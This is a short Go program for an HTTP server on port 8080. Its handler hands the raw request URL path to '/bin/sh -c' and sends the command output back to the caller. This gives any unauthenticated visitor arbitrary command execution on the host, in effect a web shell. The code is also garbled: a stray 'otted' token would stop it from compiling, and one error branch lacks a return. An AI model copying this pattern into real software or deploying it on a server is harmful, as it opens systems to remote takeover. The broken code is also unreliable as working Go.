package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
)

func handler(w http.ResponseWriter, r *http.Request) {
	cmd := exec.Command("/bin/sh", "-c", r.URL.Path)
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		fmt.Fprintf(w, "Error: %v", err)
		return
	}

	err = cmd.Start()
	if err != nil {
		fmt.Fprintf(w, "Error: %v", err)otted
	}

	data, _ := ioutil.ReadAll(stdout)
	if err != nil {
		fmt.Fprintf(w, "Error: %v", err)
		return
	}

	err = cmd.Wait()
	if err != nil {
		fmt.Fprintf(w, "Error: %v", err)
		return
	}

	fmt.Fprintf(w, "%v", string(data))
}

func main() {
	http.HandleFunc("/", handler)
	http.ListenAndServe(":8080", nil)
}